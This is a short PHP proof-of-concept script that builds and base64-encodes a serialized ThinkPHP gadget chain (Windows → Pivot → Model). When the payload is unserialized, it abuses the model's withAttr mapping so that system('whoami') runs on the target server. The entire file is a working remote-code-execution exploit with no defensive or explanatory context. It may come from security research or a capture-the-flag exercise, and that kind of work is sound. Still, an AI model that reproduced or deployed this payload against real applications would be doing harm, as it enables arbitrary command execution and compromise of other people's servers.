<?php
namespace think{
    abstract class Model{
        protected $append = [];
        private $data = [];
        protected $visible = [];
        private $withAttr = [];
        function __construct(){
            # withAttr中的键值要与data中的键值相等
            $this->data = ["huha"=>'whoami'];
            $this->withAttr = ['huha'=> 'system'];
        }
    }    
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
    }    
}

namespace think\process\pipes{
    use think\model\Pivot;
    class Windows
    {
        private $files = [];
        public function __construct()
        {
            $this->files=[new Pivot()];
        }
    }
    echo base64_encode(serialize(new Windows()));    
}

?>